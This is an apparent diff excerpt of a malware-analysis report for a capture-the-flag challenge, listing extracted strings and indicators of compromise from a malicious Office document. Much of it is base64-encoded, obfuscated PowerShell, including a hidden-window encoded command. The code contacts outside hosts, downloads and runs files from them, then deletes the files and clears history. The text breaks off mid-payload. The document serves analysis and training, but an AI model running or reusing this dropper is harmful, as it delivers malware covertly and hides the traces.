+|                   | CcAJwArACcANgA5AC4AJwArAC |                           |
+|                   | gAJwAnACsAJwBBADgAaABxACk |                           |
+|                   | AKAA2AEEAJwArACcAMwBjACcA |                           |
+|                   | KQArACcAagBwAGcAJwArACcAQ |                           |
+|                   | ABoAHQAJwArACgAJwBBACcAKw |                           |
+|                   | AnADgAaABxACkAKAAnACsAJwA |                           |
+|                   | 2AEEAJwArACcAMwBjACcAKQAr |                           |
+|                   | ACcAdAAnACsAJwBwAHMAOgBxA |                           |
+|                   | F8AeAA9AHEAcQBfAHgAPQBxAC |                           |
+|                   | cAKwAoACcAQQA4AGgAcQApACg |                           |
+|                   | AJwArACcANgBBADMAYwAnACkA |                           |
+|                   | KwAnACcAKwAnAGgAZQAnACsAK |                           |
+|                   | AAnAEEAJwArACcAOABoAHEAKQ |                           |
+|                   | AoACcAKwAnADYAQQAzAGMAJwA |                           |
+|                   | pACsAJwAnACsAJwBsAHMAJwAr |                           |
+|                   | ACcAZQBjAHQAJwArACgAJwBBA |                           |
+|                   | DgAJwArACcAaABxACkAKAA2AC |                           |
+|                   | cAKwAnAEEAMwBjACcAKQArACc |                           |
+|                   | AZgAuACcAKwAnAG4AbwAnACsA |                           |
+|                   | KAAnAEEAOAAnACsAJwBoAHEAK |                           |
+|                   | QAoACcAKwAnADYAQQAzAGMAJw |                           |
+|                   | ApACsAJwBxAF8AeAA9AHEAJwA |                           |
+|                   | rACcAYgBpACcAKwAoACcAQQAn |                           |
+|                   | ACsAJwA4AGgAcQApACgAJwArA |                           |
+|                   | CcANgBBACcAKwAnADMAYwAnAC |                           |
+|                   | kAKwAnAGwAJwArACcAZABlAHI |                           |
+|                   | AJwArACgAJwBBADgAaABxACkA |                           |
+|                   | KAA2AEEAJwArACcAMwBjACcAK |                           |
+|                   | QArACcAcQBfAHgAPQBxADQAJw |                           |
+|                   | ArACcAXwA3AGYAJwArACgAJwB |                           |
+|                   | BADgAaABxACkAKAA2ACcAKwAn |                           |
+|                   | AEEAMwBjACcAKQArACcAMgA2A |                           |
+|                   | CcAKwAnADEANAAnACsAJwBmAG |                           |
+|                   | YANQAnACsAKAAnAEEAJwArACc |                           |
+|                   | AOABoAHEAKQAoADYAQQAnACsA |                           |
+|                   | JwAzAGMAJwApACsAJwAnACsAJ |                           |
+|                   | wBkAGIAJwArACcAMQAwADQAJw |                           |
+|                   | ArACgAJwAnACsAJwBBADgAJwA |                           |
+|                   | rACcAaABxACkAKAA2AEEAMwBj |                           |
+|                   | ACcAKQArACcAZQBlACcAKwAoA |                           |
+|                   | CcAQQAnACsAJwA4AGgAcQApAC |                           |
+|                   | gAJwArACcANgBBADMAYwAnACk |                           |
+|                   | AKwAnACcAKwAnADAAOQBmADYA |                           |
+|                   | ZABmACcAKwAoACcAJwArACcAQ |                           |
+|                   | QA4AGgAcQApACgANgBBADMAYw |                           |
+|                   | AnACkAKwAnADcAOABiAGIAZgA |                           |
+|                   | nACsAKAAnACcAKwAnAEEAOABo |                           |
+|                   | AHEAKQAoADYAQQAnACsAJwAzA |                           |
+|                   | GMAJwApACsAJwAzADgANAAnAC |                           |
+|                   | sAKAAnAEEAJwArACcAOABoAHE |                           |
+|                   | AKQAoADYAQQAnACsAJwAzAGMA |                           |
+|                   | JwApACsAJwBiADUAJwArACgAJ |                           |
+|                   | wAnACsAJwBBADgAaABxACkAKA |                           |
+|                   | A2ACcAKwAnAEEAMwBjACcAKQA |                           |
+|                   | rACcALgBqACcAKwAnAHAAZwAn |                           |
+|                   | ACsAJwBAAGgAJwArACgAJwBBA |                           |
+|                   | DgAJwArACcAaABxACkAKAA2AC |                           |
+|                   | cAKwAnAEEAMwBjACcAKQArACc |                           |
+|                   | AdAB0AHAAJwArACcAcwA6ACcA |                           |
+|                   | KwAoACcAQQA4AGgAcQApACgAN |                           |
+|                   | gBBACcAKwAnADMAYwAnACkAKw |                           |
+|                   | AnAHEAXwB4AD0AcQAnACsAJwB |                           |
+|                   | xAF8AeAA9AHEAaABlAGwAcwAn |                           |
+|                   | ACsAKAAnAEEAJwArACcAOABoA |                           |
+|                   | HEAKQAoADYAQQAnACsAJwAzAG |                           |
+|                   | MAJwApACsAJwBlAGMAJwArACg |                           |
+|                   | AJwBBACcAKwAnADgAaABxACkA |                           |
+|                   | KAA2AEEAJwArACcAMwBjACcAK |                           |
+|                   | QArACcAdABmACcAKwAnAC4Abg |                           |
+|                   | BvAHEAXwB4AD0AcQBiACcAKwA |                           |
+|                   | oACcAQQA4ACcAKwAnAGgAcQAp |                           |
+|                   | ACgAJwArACcANgBBADMAYwAnA |                           |
+|                   | CkAKwAnAGkAbAAnACsAJwBkAG |                           |
+|                   | UAcgBxAF8AeAA9AHEAJwArACg |                           |
+|                   | AJwBBACcAKwAnADgAaABxACkA |                           |
+|                   | KAA2AEEAJwArACcAMwBjACcAK |                           |
+|                   | QArACcANQBfACcAKwAnADMAOA |                           |
+|                   | BkADYANwAnACsAKAAnAEEAOAB |                           |
+|                   | oAHEAKQAoADYAQQAnACsAJwAz |                           |
+|                   | AGMAJwApACsAJwBhACcAKwAnA |                           |
+|                   | GYAMwA4ADUAJwArACcANwAzAC |                           |
+|                   | cAKwAoACcAJwArACcAQQA4ACc |                           |
+|                   | AKwAnAGgAcQApACgAJwArACcA |                           |
+|                   | NgBBADMAYwAnACkAKwAnADIAZ |                           |
+|                   | gA1ACcAKwAoACcAQQA4AGgAcQ |                           |
+|                   | ApACgANgAnACsAJwBBADMAYwA |                           |
+|                   | nACkAKwAnACcAKwAnAGQANgAz |                           |
+|                   | ACcAKwAoACcAQQA4ACcAKwAnA |                           |
+|                   | GgAcQApACgAJwArACcANgBBAD |                           |
+|                   | MAYwAnACkAKwAnADIAJwArACc |                           |
+|                   | AOAA0ACcAKwAnAGQAYgAzADkA |                           |
+|                   | JwArACgAJwAnACsAJwBBADgAa |                           |
+|                   | ABxACkAKAA2AEEAJwArACcAMw |                           |
+|                   | BjACcAKQArACcAYwA1ADEAJwA |                           |
+|                   | rACcAOQA1AGIAYQAnACsAKAAn |                           |
+|                   | ACcAKwAnAEEAOABoAHEAKQAoA |                           |
+|                   | DYAQQAnACsAJwAzAGMAJwApAC |                           |
+|                   | sAJwAuACcAKwAnAGoAcABnACc |                           |
+|                   | AKQAuACIAUgBgAEUAUABgAEwA |                           |
+|                   | QQBgAGMAZQAiACgAJwBBADgAa |                           |
+|                   | ABxACkAKAA2AEEAMwBjACcALA |                           |
+|                   | AkAFIAZQBJAFUAQgBLAE4AKQA |                           |
+|                   | tAHIAZQBQAGwAYQBDAEUAKAAn |                           |
+|                   | AHEAXwB4AD0AcQAnACwAWwBzA |                           |
+|                   | FQAcgBpAG4AZwBdAFsAQwBIAG |                           |
+|                   | EAUgBdADQANwApACkAOwAkAGQ |                           |
+|                   | AaABlAG8ARQBPADEAeQAgAD0A |                           |
+|                   | IAAoACgAJABIAE8ATQBFACAAK |                           |
+|                   | wAoACIAUQBJAG0AawBrAEcAZQ |                           |
+|                   | BnAFgAVgBYAEEASQBsAHEAQwB |                           |
+|                   | VAEoAbwBTAFAAcQBDAGkASQBs |                           |
+|                   | AHEAQwBxAGwATgA4AEwAQwB1A |                           |
+|                   | DgASQBsAHEAQwA4AFEAagBQAF |                           |
+|                   | cAbwAwADYASQBsAHEAQwAiAFs |                           |
+|                   | ALQAxAC4ALgAtADUAMgBdACAA |                           |
+|                   | LQBqAG8AaQBuACAAJwAnACkAI |                           |
+|                   | AApAC4AcgBlAHAAbABhAGMAZQ |                           |
+|                   | AoACAAIgBDAHEAbABJACIALAB |                           |
+|                   | bAHMAdAByAGkAbgBnAF0AWwBj |                           |
+|                   | AGgAYQByAF0AOQAyACkAKQA7A |                           |
+|                   | CQASgBlAE8AUwBYADcAdwBmAE |                           |
+|                   | wAYwAgAD0AIAAoAFsAcwB0AHI |                           |
+|                   | AaQBuAGcAXQAoACIAewAxADMA |                           |
+|                   | fQB7ADYAfQB7ADIAOAB9AHsAM |                           |
+|                   | AB9AHsAMQAyAH0AewAyADQAfQ |                           |
+|                   | B7ADIANgB9AHsAMQA1AH0AewA |                           |
+|                   | yADMAfQB7ADUAfQB7ADEAMAB9 |                           |
+|                   | AHsAMgB9AHsAMQA3AH0AewAzA |                           |
+|                   | H0AewAyADQAfQB7ADEAMQB9AH |                           |
+|                   | sAMQB9AHsAMgA4AH0AewAxADc |                           |
+|                   | AfQB7ADEAOQB9AHsAMgA2AH0A |                           |
+|                   | ewAxADUAfQB7ADgAfQB7ADUAf |                           |
+|                   | QB7ADIANAB9AHsAMQAwAH0Aew |                           |
+|                   | AxADQAfQB7ADIANQB9AHsAMQA |                           |
+|                   | 4AH0AewAxADkAfQB7ADIANwB9 |                           |
+|                   | AHsANAB9AHsAMgA0AH0AewAxA |                           |
+|                   | DEAfQB7ADIAfQB7ADIAMgB9AH |                           |
+|                   | sAMgAwAH0AewAxADkAfQB7ADc |                           |
+|                   | AfQB7ADIAMQB9AHsAMwB9AHsA |                           |
+|                   | OQB9AHsAMgA0AH0AewAxADcAf |                           |
+|                   | QB7ADEANgB9AHsAMgA1AH0AIg |                           |
+|                   | AgAC0AZgAnAHUAJwAsACcAaQA |                           |
+|                   | nACwAJwBBACcALAAnAGUAJwAs |                           |
+|                   | ACcAcwAnACwAJwB0ACcALAAnA |                           |
+|                   | EsAJwAsACcAQwAnACwAJwBGAC |                           |
+|                   | cALAAnAFkAJwAsACcAdwAnACw |                           |
+|                   | AJwBNACcALAAnADoAJwAsACcA |                           |
+|                   | aAAnACwAJwBJACcALAAnAG8AJ |                           |
+|                   | wAsACcAVQAnACwAJwBSACcALA |                           |
+|                   | AnAGQAJwAsACcATwAnACwAJwB |                           |
+|                   | EACcALAAnAGsAJwAsACcAbAAn |                           |
+|                   | ACwAJwBmACcALAAnAFwAJwAsA |                           |
+|                   | CcATgAnACwAJwBTACcALAAnAF |                           |
+|                   | cAJwAsACcAYwAnACkAKQA7ACQ |                           |
+|                   | ASwBGAEgATwBYACAAPQAgACgA |                           |
+|                   | WwBzAHQAcgBpAG4AZwBdACgAI |                           |
+|                   | gB7ADYAfQB7ADIAMAB9AHsAMg |                           |
+|                   | A3AH0AewAwAH0AewAxADAAfQB |                           |
+|                   | 7ADIAMwB9AHsAMgA0AH0AewAx |                           |
+|                   | ADYAfQB7ADIAMgB9AHsAMQA5A |                           |
+|                   | H0AewA5AH0AewAxADcAfQB7AD |                           |
+|                   | EANQB9AHsAMQAxAH0AewAyADM |                           |
+|                   | AfQB7ADEAMwB9AHsAMQB9AHsA |                           |
+|                   | NQB9AHsAMQA1AH0AewAxADQAf |                           |
+|                   | QB7ADIANAB9AHsAMQA2AH0Aew |                           |
+|                   | A3AH0AewAzAH0AewAyADMAfQB |                           |
+|                   | 7ADkAfQB7ADEAMgB9AHsAMgA1 |                           |
+|                   | AH0AewAxADgAfQB7ADEANAB9A |                           |
+|                   | HsAMgA2AH0AewAyAH0AewAyAD |                           |
+|                   | MAfQB7ADEAMwB9AHsAMQA3AH0 |                           |
+|                   | AewAyADEAfQB7ADEAOAB9AHsA |                           |
+|                   | MQA2AH0AewA1AH0AewA0AH0Ae |                           |
+|                   | wAxADEAfQB7ADgAfQAiACAALQ |                           |
+|                   | BmACcAdQAnACwAJwBpACcALAA |                           |
+|                   | nAHMAJwAsACcAdAAnACwAJwBL |                           |
+|                   | ACcALAAnAEMAJwAsACcASAAnA |                           |
+|                   | CwAJwBGACcALAAnAFkAJwAsAC |                           |
+|                   | cAdwAnACwAJwA6ACcALAAnAEU |                           |
+|                   | AJwAsACcASQAnACwAJwBtACcA |                           |
+|                   | LAAnAG8AJwAsACcAUgAnACwAJ |                           |
+|                   | wBPACcALAAnAGEAJwAsACcARA |                           |
+|                   | AnACwAJwBUACcALAAnAGsAJwA |                           |
+|                   | sACcAbAAnACwAJwBmACcALAAn |                           |
+|                   | AFwAJwAsACcAUwAnACwAJwBuA |                           |
+|                   | CcALAAnAFcAJwAsACcAYwAnAC |                           |
+|                   | kAKQA7ACQAbAB1ADgAOQBOAEM |                           |
+|                   | ANwBIAHEAIAA9ACAAIgBtAGEA |                           |
+|                   | bABkAG8AYwBrAGsAZQB5ACIAO |                           |
+|                   | wAkAE8AQgA5ADcAYQBaACAAPQ |                           |
+|                   | AgACQAZABoAGUAbwBFAE8AMQB |                           |
+|                   | 5ACsAIgA2AC4AagBwAGcAIgA7 |                           |
+|                   | ACQAZwBOAE4AaQBwAFcAIAA9A |                           |
+|                   | CAAJABjADQAdAA2AGIAWgBuAH |                           |
+|                   | UAIAArACAAJABnAE4ATgBpAHA |                           |
+|                   | AVwA7ACQASgBNAHEAdwBsAGwA |                           |
+|                   | SgBkADcAawA9ADEAOwAkAEEAe |                           |
+|                   | QBEAGkAcQBoAFgAUwB4AD0AIg |                           |
+|                   | AiADsAZgBvAHIAIAAoACQAUgB |                           |
+|                   | NAGgAdgBSAGIAaABuAD0AMAA7 |                           |
+|                   | ACQAUgBNAGgAdgBSAGIAaABuA |                           |
+|                   | CAALQBsAHQAIAAkAEcAQwBtAH |                           |
+|                   | oAdABOAFcAegAuAGwAZQBuAGc |                           |
+|                   | AdABoADsAJABSAE0AaAB2AFIA |                           |
+|                   | YgBoAG4APQAkAFIATQBoAHYAU |                           |
+|                   | gBiAGgAbgArADMAKQAgAHsAJA |                           |
+|                   | BBAHkARABpAHEAaABYAFMAeAA |                           |
+|                   | 9ACQAQQB5AEQAaQBxAGgAWABT |                           |
+|                   | AHgAKwAgACgAWwBzAHQAcgBpA |                           |
+|                   | G4AZwBdAFsAYwBoAGEAcgBdAC |                           |
+|                   | gAKABbAGkAbgB0AF0AKAAkAEc |                           |
+|                   | AQwBtAHoAdABOAFcAegBbACQA |                           |
+|                   | UgBNAGgAdgBSAGIAaABuAC4AL |                           |
+|                   | gAoACQAUgBNAGgAdgBSAGIAaA |                           |
+|                   | BuACsAMgApAF0AIAAtAGoAbwB |                           |
+|                   | pAG4AIAAnACcAKQApAC0AJABK |                           |
+|                   | AE0AcQB3AGwAbABKAGQANwBrA |                           |
+|                   | CkAKQA7ACQASgBNAHEAdwBsAG |                           |
+|                   | wASgBkADcAawA9ACQASgBNAHE |                           |
+|                   | AdwBsAGwASgBkADcAawArADEA |                           |
+|                   | fQA7AE4AZQB3AC0ASQB0AGUAb |                           |
+|                   | QAgAC0AcABhAHQAaAAgACQASg |                           |
+|                   | BlAE8AUwBYADcAdwBmAEwAYwA |                           |
+|                   | gAC0AbgBhAG0AZQAgACQAbAB1 |                           |
+|                   | ADgAOQBOAEMANwBIAHEAIAAtA |                           |
+|                   | HYAYQBsAHUAZQAgACQAQQB5AE |                           |
+|                   | QAaQBxAGgAWABTAHgAIAAtAGY |                           |
+|                   | AbwByAGMAZQAgAHwAIABvAHUA |                           |
+|                   | dAAtAG4AdQBsAGwAOwAkAEgAY |                           |
+|                   | wBvAFUAUQBQADoAOgAiAGMAcg |                           |
+|                   | BlAGEAdABlAGQAaQByAGUAYwB |                           |
+|                   | 0AG8AcgB5ACIAKAAgACQAZABo |                           |
+|                   | AGUAbwBFAE8AMQB5ACkAOwBmA |                           |
+|                   | G8AcgBlAGEAYwBoACAAKAAkAD |                           |
+|                   | MAQgA5AFYAbQBaAEoAIABpAG4 |                           |
+|                   | AIAAkAGMAUgBiAGMAbwA2AHEA |                           |
+|                   | MQBSAFYALgByAGUAcABsAGEAY |                           |
+|                   | wBlACgAJwBnAHIAYQBtAG0AYQ |                           |
+|                   | ByAGwAeQAnACwAJwAuAGUAeAB |                           |
+|                   | lACcAKQAuAHMAcABsAGkAdAAo |                           |
+|                   | AFsAYwBoAGEAcgBdADYANAApA |                           |
+|                   | C4AcwBwAGwAaQB0ACgAWwBjAG |                           |
+|                   | gAYQByAF0AMQAyADQAKQAuAHI |                           |
+|                   | AZQBwAGwAYQBjAGUAKAAkADkA |                           |
+|                   | LAAkADEAMAApACkAewBpAGYAK |                           |
+|                   | AAkADAAQgA3AHUAQwAxAGYAUw |                           |
+|                   | AzADoAOgBFAHgAaQBzAHQAcwA |                           |
+|                   | oACQATwBCADkANwBhAFoAKQAp |                           |
+|                   | AHsAYgByAGUAYQBrAH0ASQBuA |                           |
+|                   | HYAbwBrAGUALQBXAGUAYgBSAG |                           |
+|                   | UAcQB1AGUAcwB0ACAALQBVAHI |                           |
+|                   | AaQAgACQAMwBCADkAVgBtAFoA |                           |
+|                   | SgAgAC0ATwB1AHQARgBpAGwAZ |                           |
+|                   | QAgACQATwBCADkANwBhAFoAfQ |                           |
+|                   | BzAHQAYQByAHQAIAAkAE8AQgA |                           |
+|                   | 5ADcAYQBaADsAJABjADQAdAA2 |                           |
+|                   | AGIAWgBuAHUAPQAkAGcATgBOA |                           |
+|                   | GkAcABXACsAJABPAEIAOQA3AG |                           |
+|                   | EAWgArACQATwBCADkANwBhAFo |                           |
+|                   | AOwAkAGcATgBOAGkAcABXAD0A |                           |
+|                   | JABjADQAdAA2AGIAWgBuAHUAO |                           |
+|                   | wBTAHQAYQByAHQALQBTAGwAZQ |                           |
+|                   | BlAHAAIAAtAHMAIAAxADsAUgB |                           |
+|                   | lAG0AbwB2AGUALQBpAHQAZQBt |                           |
+|                   | ACAALQByAGUAYwB1AHIAcwBlA |                           |
+|                   | CAALQBwAGEAdABoACAAIAAoAC |                           |
+|                   | QASABvAG0AZQArACIAXAAiACs |                           |
+|                   | AJABkAGgAZQBvAEUATwAxAHkA |                           |
+|                   | LgByAGUAcABsAGEAYwBlACgAJ |                           |
+|                   | ABIAG8AbQBlACsAIgBcACIALA |                           |
+|                   | AkAFkAUwBNAEwAUwApAC4AcwB |                           |
+|                   | wAGwAaQB0ACgAWwBzAHQAcgBp |                           |
+|                   | AG4AZwBdAFsAYwBoAGEAcgBdA |                           |
+|                   | DkAMgApAFsAMABdACkAOwBjAG |                           |
+|                   | wAZQBhAHIALQBoAGkAcwB0AG8 |                           |
+|                   | AcgB5ADsAfQBlAGwAcwBlAHsA |                           |
+|                   | YwBsAGUAYQByAC0AaABpAHMAd |                           |
+|                   | ABvAHIAeQA7AGUAeABpAHQAfQ |                           |
+|                   | B9ACQAbwBLAE8AYwBiAEcAMQB |                           |
+|                   | EAEMAPQAkAEcAOQA2AGgASgBw |                           |
+|                   | ACsAJABxAHIAVgB0AHEAMgBwA |                           |
+|                   | HgAQwA=', 'NULL', 'NULL', |                           |
+|                   | 'NULL']                   |                           |
++-------------------+---------------------------+---------------------------+
+
+Intermediate IOCs:
+
++---------------------------------------------------------+
+http://helsectf.no/bilder/1_17178dd759fa2e8970c573fb9e19fd71.jpg
++---------------------------------------------------------+
+http://schemas.openxmlformats.org/drawingml/2006/main
++---------------------------------------------------------+
+http://schemas.openxmlformats.org/officeDocument/2006/bibliography
++---------------------------------------------------------+
+http://schemas.openxmlformats.org/officeDocument/2006/customXml
++---------------------------------------------------------+
+powersheLl -w h -e 0JABRAEkAcwBtAHQAPQAnAGUAdgBpAGwALgBjAG8AbQAnADsAJABqADYAUgA5AEIAPQAnAGUAdgBpAGwALgBvAHIAZwAnADsAJABpAE0ANgBQAEkAZgBTADQAMAA9ACcAdwBoAGEAdABpAHMAbQB5AGkAcAAuAGMAbwBtACcAOwBTAHYAIAAgACgAJwAwAEIANwB1AEMAMQBmAFMAMwAnACkAIAAoAFsAdAB5AHAAZQBdACgAIgB7ADkAfQB7ADEAMQB9AHsANwB9AHsAMwB9AHsAOAB9AHsANgB9AHsANAB9AHsAMQAwAH0AewAwAH0AewA0AH0AewAxAH0AewAyAH0AewA1AH0AewAxADIAfQAiACAALQBmACcAbwAnACwAJwBGACcALAAnAGkAJwAsACcAVAAnACwAJwAuACcALAAnAGwAJwAsACcATQAnACwAJwBzACcALAAnAGUAJwAsACcAUwAnACwAJwBJACcALAAnAHkAJwAsACcARQAnACkAKQA7ACQARQBLAGMAMABZAHIAeQBUAGIAIAA9ACAAJABLAGIAUQA1AGQAaAB6ACAAKwAgACQAYQByAGcAcwBbADAAXQA7ACQAZgA2AEIAMAB4AE8AIAA9ACAAIgBpAGYAYwBvAG4AZgBpAGcALgBtAGUAIgA7AHMAVgAgACAAKAAnAEgAYwBvAFUAUQBQACcAKQAgACgAWwB0AHkAUABlAF0AKAAiAHsANwB9AHsANAB9AHsAOQB9AHsAMQAwAH0AewA4AH0AewA2AH0AewA1AH0AewAzAH0AewAxAH0AewA1AH0AewAxADEAfQB7ADMAfQB7ADIAfQB7ADgAfQB7ADAAfQB7ADEAMAB9AHsAMQB9AHsAMgB9AHsANAB9ACIAIAAtAGYAJwBDACcALAAnAE8AJwAsACcAcgAnACwAJwBpACcALAAnAFkAJwAsACcALgAnACwAJwBNACcALAAnAHMAJwAsACcARQAnACwAJwBTACcALAAnAHQAJwAsACcAZAAnACkAKQA7AHMAdgAgACgAJwBJAEcAegBwAHkANQB2AGEASQB5ACcAKQAgACgAWwB0AHkAcABlAF0AKAAiAHsAMQAwAH0AewAwAH0AewAxADAAfQB7ADEAMQB9AHsAOAB9AHsAMwB9AHsAMQB9AHsAMQA0AH0AewAxADIAfQB7ADEAMQB9AHsAMQB9AHsANAB9AHsAOAB9AHsANgB9AHsANwB9AHsAOQB9AHsAMQAzAH0AewA4AH0AewA1AH0AewAyAH0AIgAgAC0AZgAnAFkAJwAsACcALgAnACwAJwBUACcALAAnAE0AJwAsACcAdwAnACwAJwBOACcALAAnAGIAJwAsACcAYwAnACwAJwBlACcALAAnAEwAJwAsACcAUwAnACwAJwB0ACcALAAnAEUAJwAsACcASQAnACwAJwBuACcAKQApADsAJAB5AEMANABKAGkAMgAgAD0AIAAiAGYAcgBlAGUAZwBlAG8AaQBwAC4AYQBwAHAAIgA7ACQAZQAzAGYAMQA1ADkAIAA9ACAAJABqADYAUgA5AEIAIAArACAAJABJAFAAdQB1AHYANgBOADsAJABJAFAAdQB1AHYANgBOACAAPQAgACIAbwB4AG0AbAB4AG0AbABvAHgAbQBsACIALgByAGUAcABsAGEAYwBlACgAKAAiAG8AIgArACIAeABtACIAKwAiAGwAIgApACwAWwBzAHQAcgBpAG4AZwBdAFsAYwBoAGEAcgBdADQANwApADsAJAAyAFQAdwBPAE4ARgBaACAAPQAgACQAeQBDADQASgBpADIAIAArACAAJABJAFAAdQB1AHYANgBOADsAaQBmACgAVABlAHMAdAAtAEMAbwBuAG4AZQBjAHQAaQBvAG4AIAAtAFEAdQBpAGUAdAAgACQAUQBJAHMAbQB0ACkAewBlAHgAaQB0AH0AZQBsAHMAZQB7AGkAZgAoAFQAZQBzAHQALQBDAG8AbgBuAGUAYwB0AGkAbwBuACAALQBRAHUAaQBlAHQAIAAkAGoANgBSADkAQgApAHsAJABjAFIAYgBjAG8ANgBxADEAUgBWAD0AIAAoACgAJwBoAHQAJwArACgAJwAnACsAJwBBADgAaABxACkAKAA2AEEAJwArACcAMwBjACcAKQArACcAdABwAHMAOgAnACsAKAAnAEEAOAAnACsAJwBoAHEAKQAoADYAJwArACcAQQAzAGMAJwApACsAJwAnACsAJwBxAF8AeAA9AHEAcQBfAHgAPQBxAGgAJwArACcAZQBsAHMAJwArACgAJwBBADgAaABxACkAKAA2AEEAMwBjACcAKQArACcAJwArACcAZQBjACcAKwAoACcAQQAnACsAJwA4AGgAcQApACgAJwArACcANgBBADMAYwAnACkAKwAnAHQAZgAuAG4AJwArACcAbwBxAF8AeAA9AHEAYgAnACsAKAAnAEEAJwArACcAOABoAHEAKQAoACcAKwAnADYAQQAzAGMAJwApACsAJwBpACcAKwAnAGwAZABlAHIAJwArACcAcQBfAHgAPQBxADEAJwArACgAJwBBADgAJwArACcAaABxACkAKAAnACsAJwA2AEEAJwArACcAMwBjACcAKQArACcAXwAnACsAJwAxAGUAZAAnACsAKAAnACcAKwAnAEEAOABoAHEAKQAoADYAQQAnACsAJwAzAGMAJwApACsAJwA5AGUAMQAnACsAJwBiADcAZQBkACcAKwAoACcAQQAnACsAJwA4AGgAcQApACgANgAnACsAJwBBADMAYwAnACkAKwAnADAAMwAnACsAKAAnAEEAJwArACcAOABoAHEAKQAoACcAKwAnADYAQQAzAGMAJwApACsAJwA4ADkAJwArACcAZQBhADMAJwArACgAJwBBADgAJwArACcAaABxACkAKAA2AEEAJwArACcAMwBjACcAKQArACcANAAnACsAJwAzAGEAMQAnACsAKAAnAEEAOAAnACsAJwBoAHEAKQAoADYAJwArACcAQQAzAGMAJwApACsAJwBiAGIAMgAnACsAKAAnACcAKwAnAEEAOABoAHEAKQAoADYAJwArACcAQQAzAGMAJwApACsAJwBiADgAJwArACgAJwBBACcAKwAnADgAaABxACkAKAA2ACcAKwAnAEEAMwBjACcAKQArACcAJwArACcANABiACcAKwAnADkAZQAnACsAKAAnAEEAOAAnACsAJwBoAHEAKQAoADYAQQAzAGMAJwApACsAJwA4ACcAKwAnADIALgBqAHAAJwArACgAJwBBACcAKwAnADgAaABxACkAKAA2ACcAKwAnAEEAMwBjACcAKQArACcAZwAnACsAKAAnAEEAOAAnACsAJwBoAHEAKQAoADYAJwArACcAQQAzAGMAJwApACsAJwAnACsAJwBAAGgAdAAnACsAJwB0AHAAJwArACcAcwA6ACcAKwAoACcAJwArACcAQQA4AGgAcQApACgANgBBACcAKwAnADMAYwAnACkAKwAnAHEAXwB4AD0AcQBxAF8AeAA9AHEAaAAnACsAJwBlAGwAcwBlACcAKwAoACcAQQAnACsAJwA4AGgAcQApACgANgBBACcAKwAnADMAYwAnACkAKwAnACcAKwAnAGMAdABmAC4AJwArACgAJwAnACsAJwBBADgAaABxACkAKAAnACsAJwA2AEEAMwBjACcAKQArACcAbgAnACsAJwBvAHEAXwB4AD0AcQAnACsAKAAnAEEAOABoAHEAKQAoADYAQQAnACsAJwAzAGMAJwApACsAJwBiACcAKwAnAGkAbABkACcAKwAoACcAQQA4ACcAKwAnAGgAcQApACgAJwArACcANgBBADMAYwAnACkAKwAnACcAKwAnAGUAcgAnACsAKAAnAEEAOABoAHEAKQAoADYAQQAzAGMAJwApACsAJwAnACsAJwBxAF8AeAA9AHEAMgBfACcAKwAoACcAQQA4AGgAcQApACgANgAnACsAJwBBADMAYwAnACkAKwAnAGMAJwArACgAJwAnACsAJwBBADgAaABxACkAKAA2ACcAKwAnAEEAMwBjACcAKQArACcAMgA1ACcAKwAnAGQAZgAnACsAJwA1ADkANAAnACsAKAAnACcAKwAnAEEAOABoAHEAKQAoADYAQQAzAGMAJwApACsAJwA0ACcAKwAnAGUANAA5ACcAKwAnAGYANQAxACcAKwAoACcAQQAnACsAJwA4AGgAcQApACgANgBBACcAKwAnADMAYwAnACkAKwAnACcAKwAnADMAOQAzADcAJwArACcAZABkADAAJwArACgAJwBBACcAKwAnADgAaABxACkAKAAnACsAJwA2AEEAMwBjACcAKQArACcANwA3ACcAKwAnADkANAA3ACcAKwAoACcAJwArACcAQQA4ACcAKwAnAGgAcQApACgANgAnACsAJwBBADMAYwAnACkAKwAnACcAKwAnAGYAYgA1ACcAKwAoACcAJwArACcAQQA4AGgAcQApACgANgBBACcAKwAnADMAYwAnACkAKwAnADAAJwArACgAJwBBADgAaABxACkAKAAnACsAJwA2AEEAMwBjACcAKQArACcANAAuACcAKwAnAGoAcAAnACsAKAAnAEEAOABoAHEAKQAoADYAQQAzAGMAJwApACsAJwBnACcAKwAnAEAAaAB0ACcAKwAnAHQAcAAnACsAKAAnACcAKwAnAEEAOABoAHEAKQAoADYAQQAnACsAJwAzAGMAJwApACsAJwBzADoAcQBfAHgAPQBxACcAKwAoACcAJwArACcAQQA4AGgAcQApACgANgAnACsAJwBBADMAYwAnACkAKwAnAHEAXwB4AD0AcQAnACsAKAAnAEEAOABoAHEAKQAoADYAQQAnACsAJwAzAGMAJwApACsAJwBoAGUAJwArACcAbABzAGUAJwArACgAJwBBACcAKwAnADgAaABxACkAKAA2ACcAKwAnAEEAMwBjACcAKQArACcAYwAnACsAKAAnAEEAOABoAHEAKQAoADYAQQAzAGMAJwApACsAJwB0ACcAKwAoACcAQQAnACsAJwA4AGgAcQApACgANgBBADMAYwAnACkAKwAnACcAKwAnAGYALgBuAG8AcQBfAHgAPQBxACcAKwAoACcAQQAnACsAJwA4AGgAcQApACgANgAnACsAJwBBADMAYwAnACkAKwAnACcAKwAnAGIAaQBsACcAKwAnAGQAZQByACcAKwAoACcAJwArACcAQQA4AGgAcQApACgANgAnACsAJwBBADMAYwAnACkAKwAnAHEAXwB4AD0AcQAzACcAKwAnAF8AYwAyACcAKwAoACcAQQA4AGgAcQApACgANgBBACcAKwAnADMAYwAnACkAKwAnAGMAJwArACcANQA5AGMAJwArACcAMAA3AGQAJwArACgAJwBBACcAKwAnADgAaABxACkAKAAnACsAJwA2AEEAMwBjACcAKQArACcAJwArACcAMQA2AGMAYwAnACsAJwA5ADcAJwArACgAJwBBADgAJwArACcAaABxACkAKAA2AEEAMwBjACcAKQArACcAOQAyADUAJwArACcAOQAwADkAJwArACgAJwAnACsAJwBBADgAaABxACkAKAA2AEEAJwArACcAMwBjACcAKQArACcAYwAnACsAJwA5ADkAMwA3ADYAJwArACgAJwBBADgAJwArACcAaABxACkAKAA2ACcAKwAnAEEAMwBjACcAKQArACcAYQBhAGYAJwArACgAJwAnACsAJwBBADgAaABxACkAKAA2AEEAMwBjACcAKQArACcAJwArACcANgA5AC4AJwArACgAJwAnACsAJwBBADgAaABxACkAKAA2AEEAJwArACcAMwBjACcAKQArACcAagBwAGcAJwArACcAQABoAHQAJwArACgAJwBBACcAKwAnADgAaABxACkAKAAnACsAJwA2AEEAJwArACcAMwBjACcAKQArACcAdAAnACsAJwBwAHMAOgBxAF8AeAA9AHEAcQBfAHgAPQBxACcAKwAoACcAQQA4AGgAcQApACgAJwArACcANgBBADMAYwAnACkAKwAnACcAKwAnAGgAZQAnACsAKAAnAEEAJwA